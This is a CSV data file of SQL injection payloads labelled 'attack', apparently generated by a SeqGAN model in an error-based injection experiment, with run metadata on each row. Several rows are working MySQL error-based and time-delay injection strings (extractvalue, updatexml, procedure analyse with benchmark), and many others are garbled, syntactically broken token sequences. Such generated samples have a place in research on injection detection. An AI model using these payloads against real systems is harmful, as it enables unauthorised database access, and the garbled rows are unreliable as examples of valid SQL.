label,payload,family,payload_type,method,run_id,sample_index
attack,1%iknc%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,"1%"" and updatexml 1812  (  (  3393,concat  (  (  (  (  benchmark  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  =  (  9627,md5  (  =  (  3393,1   )    (  extractvalue  (  1808,concat  (  (  (  (  0x2e,md5  (  (  select   (  case and 0   (  8375  (  9103  =  (  (  8862,concat  (  (  (  0x2e,0x7171706a71  (  5000000(  (  (  3393  =  (  3393,mdua  (  e  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""x$",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,"1%""   )    )     extractvalue  (  9627,concat  (  (  (  (  (  0x5c,  (  (  (  benchmark  (  (  5000000(  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  benchmark  (  (  (  (  benchmark  (  8862,concat  (  (  (  (  =  (  (  =  (  (  3393,concat  (  (  3393,0x7171706a71,  (  select   (  elt  D  (  (  5000000,0x7171706a71(  (  5883t  (   (  8375  (  (  5000000(  (  (  1297  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack,1%%'  =  'k'  =  'ck,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%k'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%kprocen FROM analyse  (  )  elte  (  elte  (  elt  (  1808  =  1   )    (  select   (  extractvalue  (  (  (  (  0x2e,0x7171706a71,9627,m5  (  (  0x52515a50   (  1354  (  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  0x5c,  (  (  benchmark  (  (  select   (  elt  (  e  (  7982  =  (  3393,1   (  case 0 fromual",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9
attack,",(  (  =  (  7982,concat  (  (  (  (  select   (  elt  (  e  (  3393  =  (  3393,,1   (  3576  =  (  (  0x2e,md5  (  0x4b774c75   end  (  (  elt  e  (  select   (  e  (  case 0 0 from d5  (  case when   (   (  ual  )   (  2914   (  4774  (  7982,concat  (  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,10
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,11
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,12
attack,"1%""   )    )     case  9338  1559 or updatexml  9490  (  (  (  (  (  1808,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  el  (  0x5c,0x7171706a71,  (  select   (  elt  (  8862  (  (  1 as d   (n  (  elt  (  e(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  extractvalue  (  5000000,md5  =  (  (  7982  =  (  1 else cast  (  (  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,13
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,14
attack,")  (  1 alt  (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  1297,concat  (  (  (  (  0x5c,  (  select   (  elt  (  0x5c,  (  (  benchmark  (  (  t  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  (  1808,concat  (  (  (  =  5530  (  8862,concat  (  (  (  (  1049  =  (  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,15
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,16
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,17
attack,"1%""   )    )proicedure analyse  (  3539  )   (  (  (  elt   (  elt  (  1297  =  (  (  1759  (  1049  (  (  5000000,md5  (  0x2e,  (  4688  (  5000000(  (  5000000,md5  (  (  7982,concat  (  0x2e,0x7171706a71,  (  =  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,18
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,19
attack,"1""   where 1559 extractvalue  (  (  (  1808,concat  (  (  3393(  =  (  (  0x2e,0x7171706a71,  (  select   (  eltl  )  0x2e,  (  (  select   (  elt  )  0x2e,0x7171706a71,  (  (  9627,  (  (  0x2e,0x7171706a71,  (  9627,  (  (  (  0x2e,md5  (  (  1297  =  (  7982,1   from d5  (  elt  8862  =  (  (  1297  =  (  benchmark  (  1759(  (  3393  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,20
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,21
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,22
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  ""end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,23
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ')n(S7757  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x4b774c75   end  (  el  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  0x2e,concat  (  (  (  (  0x2e,  (  select   (  (  elt  (  e  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  case when   (  9836  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,24
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,25
attack,"select   (  9103  (  (  =  (  1808,1   (  5423  (  select extractvalue  (  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  1297,0x7171706a71,  (  (  select   (  1297,1   )    (  extractvalue  (  (  5000000(  (  7982  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  t  (  benchmark  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,26
attack,"1%""   )    AND AND or updatexml  (  (  (  (  (  (  (  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  (   (  (  (  (  0x2e,md5  =  (  3393,md5  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  (  (  5000000,m5  (  (  select   (  e  (   (  5322  (  (  elt  (  1808  =  (  0x4b774c75   SELECT du 5423   (  4660  )    (  (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,27
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,28
attack,"1 or extractvalue  (  (  (  2917,concat  (  (  =  (  (  0x2e,md5  (  (  0x5c,  (  (  select   (  elt  (  elt  (  1808,  (  0x5c,0x717a767a71   (  case 0 or updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  1808,md5  (  (  (  0x5c,  (  (  (  benchmark  (  (  (  0x5c,  (  (  (  benchmark  (  (  benchmark  (  (  5000000,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,29
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,30
attack,"when   (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  3393  =  (  (  9788,1   (  5777  (  select   (  (  case 1   )    )4066  )  select   (  case 0from dual  )   end  (   (  1724  (  elt  (  case when   (    5433  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  1297  =  (  (  5000000,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,31
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,32
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%k'  =  'k'  =  'kproc n   eduance   (  1354  (  (  (  e  (  1297  =  (  0x5c,0x7171706a71,  (  benchmark  (  (  select   (  elt  (  elt  (  0x5c,  (  9627,md5  (  (  0x5c,  (  select   (  case 0 from d(  elsd5  (  1808,concat  (  (  3393,1   (  6166  (  select 0 from dual  )   end  )  el  (  (  1808,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,33
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,34
attack,"1%"" or  )  updatexml  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  extractvalue  (  (  (  9393,md5  (  0x2e,0x7171706a71,  (  t  (  (  5000000,md5    (  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  benchmark  (  7982,1   )    AND wsjsel  (  (  0x5c,  (  =  (  9627,concat  (  (  (  0x2e,md5  (  (  3393  =  (  (  (  0x5c,0x7171706a71,  (  select   from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35
attack,"1%'   )    FROM proeande(  (  el  (  elt  (  1808  =  (  7982  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  0x2e,0x7171706a71,  (  l  (  (  5000000,md5  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  select   (  elt  (  1297  =  (  0x5c,0x7171706a71,  (  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36
